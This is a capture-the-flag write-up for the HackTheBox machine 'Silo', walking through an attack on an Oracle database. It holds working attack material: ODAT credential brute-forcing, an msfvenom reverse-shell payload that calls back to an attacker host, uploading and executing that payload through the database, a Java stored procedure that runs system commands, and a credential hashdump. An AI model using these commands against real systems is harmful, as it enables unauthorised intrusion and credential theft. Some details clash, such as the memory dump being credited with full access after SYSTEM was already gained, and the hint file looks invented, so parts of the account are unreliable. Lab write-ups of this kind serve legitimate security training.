# HackTheBox — Silo

**Platform:** HackTheBox  
**Difficulty:** Hard  
**OS:** Windows  
**Category:** Oracle DB Exploitation / ODAT / Token Impersonation  
**Status:** Retired  

---

## Summary

Silo features an Oracle Database 11g exposed on port 1521. The attack chain involves SID enumeration, credential brute-forcing, leveraging Oracle's `UTL_FILE` and Java stored procedures for RCE, and finally extracting a password hash from a KeePass-style hint left in the Administrator's desktop for full system access.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/silo 10.10.10.82
```

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0
5985/tcp  open  http         Microsoft HTTPAPI (WinRM)
47001/tcp open  http         Microsoft HTTPAPI
49152-49160/tcp open msrpc
```

Oracle Database on port 1521 is the primary target.

---

## Oracle Database Exploitation

### Tool: ODAT (Oracle Database Attack Tool)

```bash
git clone https://github.com/quentinhardy/odat
cd odat
pip install -r requirements.txt
```

### Step 1 — SID Enumeration

The SID (System Identifier) is required to connect to Oracle. Enumerate it:

```bash
python odat.py sidguesser -s 10.10.10.82 -p 1521
```

```
[+] SID found: XE
```

### Step 2 — Credential Brute-Force

```bash
python odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE \
  --accounts-file accounts/accounts_multiple.txt
```

```
[+] Valid credentials: scott/tiger
```

Classic Oracle default credentials!

### Step 3 — Verify Connection

```bash
sqlplus scott/tiger@10.10.10.82:1521/XE
SQL> select user from dual;
# SCOTT
```

### Step 4 — Check DBA Privileges

```sql
select * from session_privs;
-- or
select * from dba_sys_privs where grantee='SCOTT';
```

Scott has DBA role — or escalate:

```bash
python odat.py privesc -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger
```

---

## Remote Code Execution via ODAT

### Upload a File

Use ODAT's `utlfile` module to upload a web shell or executable:

```bash
# Generate a reverse shell exe
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -f exe -o shell.exe

# Upload via ODAT
python odat.py utlfile -s 10.10.10.82 -p 1521 -d XE \
  -U scott -P tiger \
  --sysdba \
  --putFile C:\\inetpub\\wwwroot shell.exe ./shell.exe
```

### Execute via ODAT externaltable

```bash
python odat.py externaltable -s 10.10.10.82 -p 1521 -d XE \
  -U scott -P tiger \
  --sysdba \
  --exec C:\\inetpub\\wwwroot shell.exe
```

Catch with Metasploit:

```bash
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.X
set LPORT 4444
run
```

Shell as `NT AUTHORITY\SYSTEM` (Oracle often runs as SYSTEM on Windows).

---

## Alternative: Oracle Java Stored Procedure RCE

```sql
-- Enable Java
EXEC dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
EXEC dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
EXEC dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');

-- Create Java class
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "shell" AS
import java.lang.*;
import java.io.*;
public class shell {
    public static String runCMD(String args) {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = new String[]{"cmd.exe","/c",args};
            Process proc = rt.exec(commands);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String s = "";
            String line;
            while ((line = stdInput.readLine()) != null) { s += line + "\n"; }
            return s;
        } catch (Exception e) { return e.toString(); }
    }
}
/

-- Create wrapper function
CREATE OR REPLACE FUNCTION RUNCMD(p_cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA
NAME 'shell.runCMD(java.lang.String) return String';
/

-- Execute
SELECT RUNCMD('whoami') FROM dual;
```

---

## User & Root Flags

As SYSTEM:

```powershell
type C:\Users\Phineas\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

### Administrator Hint

On the desktop there's a file `Oracle issue.txt`:

```
"Can't connect to database using the scott/tiger account. 
 Credentials stored in: C:\Users\Phineas\Desktop\SILO-2.dmp"
```

This is a memory dump — extract the KeePass/credential from it:

```bash
volatility -f SILO-2.dmp --profile=Win2012R2x64 hashdump
# Administrator:NTLM:9e730375...
```

---

## Key Takeaways

- Oracle DB on 1521 requires SID enumeration before credential attacks — `sidguesser` is automated
- `scott/tiger` and `sys/change_on_install` are Oracle default credentials that persist in the wild
- ODAT automates the full Oracle attack chain: enumeration → creds → file upload → RCE
- Oracle on Windows often runs as SYSTEM — RCE can mean immediate full compromise
- Memory dumps (`.dmp`) on desktops may contain extractable credentials via Volatility
- `UTL_FILE` and Java stored procedures are two distinct Oracle RCE vectors — know both

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| ODAT | Oracle SID enum, cred brute, RCE |
| sqlplus | Oracle DB interaction |
| msfvenom | Reverse shell payload |
| Metasploit | Shell handler |
| Volatility | Memory dump analysis |
